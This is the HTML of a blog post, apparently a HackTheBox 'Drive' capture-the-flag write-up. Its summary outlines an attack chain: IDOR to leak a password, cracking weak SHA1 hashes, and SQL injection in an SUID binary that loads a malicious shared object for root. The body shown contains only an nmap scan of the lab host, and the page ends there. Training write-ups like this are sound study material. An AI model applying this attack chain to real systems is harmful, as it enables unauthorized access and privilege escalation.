<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Drive is a hard difficulty box with a complex message board service, designed to mimic Google Drive. With thorough analysis, we can find that not all avenues are protected from IDOR attacks, allowing us to view hidden messages containing a shared password. Using this password to enter the system, we can find an internally hosted gitea server. The source code shows a zipping password in use, as well as noting changes to the database&#39;s password hashing algorithm. We can target the period where the weakest SHA1 hashing method was used, and crack a user&#39;s password currently in use. Finally, we see a custom binary with SUID, designed to provide administrative actions to the service from the command line. It is vulnerable to SQL injection, where we might load a malicious shared object to escalate our privileges to root authority.'><title>HackTheBox - Drive</title>

<link rel='canonical' href='http://localhost:1313/post/hackthebox-drive/'>

<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - Drive'>
<meta property='og:description' content='Drive is a hard difficulty box with a complex message board service, designed to mimic Google Drive. With thorough analysis, we can find that not all avenues are protected from IDOR attacks, allowing us to view hidden messages containing a shared password. Using this password to enter the system, we can find an internally hosted gitea server. The source code shows a zipping password in use, as well as noting changes to the database&#39;s password hashing algorithm. We can target the period where the weakest SHA1 hashing method was used, and crack a user&#39;s password currently in use. Finally, we see a custom binary with SUID, designed to provide administrative actions to the service from the command line. It is vulnerable to SQL injection, where we might load a malicious shared object to escalate our privileges to root authority.'>
<meta property='og:url' content='http://localhost:1313/post/hackthebox-drive/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Gitea' /><meta property='article:tag' content='IDOR' /><meta property='article:tag' content='SQLite' /><meta property='article:tag' content='SQL Injection' /><meta property='article:tag' content='Port Forwarding' /><meta property='article:tag' content='msfvenom' /><meta property='article:tag' content='FFUF' /><meta property='article:published_time' content='2024-02-17T19:46:53-06:00'/><meta property='article:modified_time' content='2024-02-17T19:46:53-06:00'/><meta property='og:image' content='http://localhost:1313/post/hackthebox-drive/Drive.png' />
<meta name="twitter:title" content="HackTheBox - Drive">
<meta name="twitter:description" content="Drive is a hard difficulty box with a complex message board service, designed to mimic Google Drive. With thorough analysis, we can find that not all avenues are protected from IDOR attacks, allowing us to view hidden messages containing a shared password. Using this password to enter the system, we can find an internally hosted gitea server. The source code shows a zipping password in use, as well as noting changes to the database&#39;s password hashing algorithm. We can target the period where the weakest SHA1 hashing method was used, and crack a user&#39;s password currently in use. Finally, we see a custom binary with SUID, designed to provide administrative actions to the service from the command line. It is vulnerable to SQL injection, where we might load a malicious shared object to escalate our privileges to root authority."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1313/post/hackthebox-drive/Drive.png' />
  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/spencerja'
                        target="_blank"
                        title="Github"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://app.hackthebox.com/profile/1202496'
                        target="_blank"
                        title="HackTheBox"
                    >
                        
                        
                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
    <g>
        <path
            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
        </path>
    </g>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://ctftime.org/team/217710'
                        target="_blank"
                        title="Team"
                    >
                        
                        
                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
    preserveAspectRatio="xMidYMid meet">
    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
    </g>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://tryhackme.com/p/spencerj'
                        target="_blank"
                        title="TryHackMe"
                    >
                        
                        
                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
</svg>

                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        

        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
                <li id="i18n-switch">  
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
                        
                            <option value="http://localhost:1313/" selected>English</option>
                        
                    </select>
                </li>
            
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>
<main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/post/hackthebox-drive/">
                <img src="/post/hackthebox-drive/Drive_hu501960eeac16eccd918d7d9edf7f2484_365098_800x0_resize_box_3.png"
                        srcset="/post/hackthebox-drive/Drive_hu501960eeac16eccd918d7d9edf7f2484_365098_800x0_resize_box_3.png 800w, /post/hackthebox-drive/Drive_hu501960eeac16eccd918d7d9edf7f2484_365098_1600x0_resize_box_3.png 1600w"
                        width="800" 
                        height="666" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Drive" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/hack-the-box/" >
                Hack the Box
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/post/hackthebox-drive/">HackTheBox - Drive</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Drive is a hard difficulty box with a complex message board service, designed to mimic Google Drive. With thorough analysis, we can find that not all avenues are protected from IDOR attacks, allowing us to view hidden messages containing a shared password. Using this password to enter the system, we can find an internally hosted gitea server. The source code shows a zipping password in use, as well as noting changes to the database&#39;s password hashing algorithm. We can target the period where the weakest SHA1 hashing method was used, and crack a user&#39;s password currently in use. Finally, we see a custom binary with SUID, designed to provide administrative actions to the service from the command line. It is vulnerable to SQL injection, where we might load a malicious shared object to escalate our privileges to root authority.
        </h3>
        
    </div>

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Feb 17, 2024</time>
            </div>
        

        
    </footer>
    

    
</div>
</header>

    <section class="article-content">
    
    
    <h2 id="enumeration">Enumeration</h2>
<p>initial nmap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.129.150.85
</span></span><span class="line"><span class="cl">Host is up (0.061s latency).
</span></span><span class="line"><span class="cl">Not shown: 997 closed tcp ports (conn-refused)
</span></span><span class="line"><span class="cl">PORT     STATE    SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
</span></span><span class="line"><span class="cl">|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
</span></span><span class="line"><span class="cl">80/tcp   open     http    nginx 1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://drive.htb/
</span></span><span class="line"><span class="cl">3000/tcp filtered ppp
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 10.89 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><p>We are redirected to <code>drive.htb</code>, so this must be added to /etc/hosts:</p>
